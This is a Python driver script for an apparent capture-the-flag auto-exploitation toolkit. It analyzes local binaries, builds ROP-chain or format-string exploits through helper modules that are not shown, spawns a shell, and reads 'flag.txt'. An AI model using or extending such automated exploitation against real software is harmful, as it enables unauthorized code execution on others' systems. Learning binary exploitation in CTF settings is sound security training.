#!/usr/bin/env python3
from pwn import *
import sys
from analyze import *
import Fart_FMT
import Fart_ROP
import time
import traceback
import threading
import os

logging.getLogger('pwnlib').setLevel(logging.WARNING)

banner = '''
   ad88                                
  d8"                           ,d     
  88                            88     
MM88MMM ,adPPYYba, 8b,dPPYba, MM88MMM  
  88    ""     `Y8 88P'   "Y8   88     
  88    ,adPPPPP88 88           88     
  88    88,    ,88 88           88,    
  88    `"8bbdP"Y8 88           "Y888
  
  Format And ROP Toolkit \U0001F4A8 
'''


fire = "\U0001F525"

gs = '''
b win
continue
'''
context.terminal = ["tmux", "splitw", "-h"]

def start(binary):
    e = context.binary = ELF(binary)
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

def exploit(analyize):
    binary = analyze.binary
    p = start(binary)
    payload = None
    
    if not analyze.has_leak():
        rop = Fart_ROP.ROP(analyze)
        try:
            send(rop.build_exploit(), p, analyze)
        except EOFError:
            p = process(binary)
            send(rop.build_exploit(failed=True), p, analyze)
    else:
        fmt = Fart_FMT.FMT(analyze)
        send(fmt.build_exploit(), p, analyze)

def send(payload, p, analyze):

    if payload:
        p.sendline(payload)
        if analyze.has_binsh():
            sleep(0.1)
            p.sendline(b"cat flag.txt")
        p.recvuntil(b"flag")
        print(fire + " flag" + p.recvuntil(b"}").decode("utf-8") + " " + fire)


def __libc_fart_main(binary):
    global analyze
    try: 
        analyze = Analyze(binary)
        exploit(analyze)
    except Exception as e:
        print("[-] Well this stinks! We've encountered an exception we don't know how to handle!")
        print("Exception Type: " + str(e.__class__.__name__))
        print("Exception Message: " + str(e))
        #print(traceback.format_exc())

if __name__ == "__main__":
    print(banner)
    
    bins_dir = args.DIR
    bins = []
    
    if bins_dir:
        for binary in os.listdir(bins_dir):    
            bins.append(bins_dir + "/" + binary)
    
        for binary in bins:
            #thread = threading.Thread(target=__libc_fart_main, args=(binary,))
            #thread.start()
            __libc_fart_main(binary)
    else:
        binary = args.BIN
        __libc_fart_main(binary)
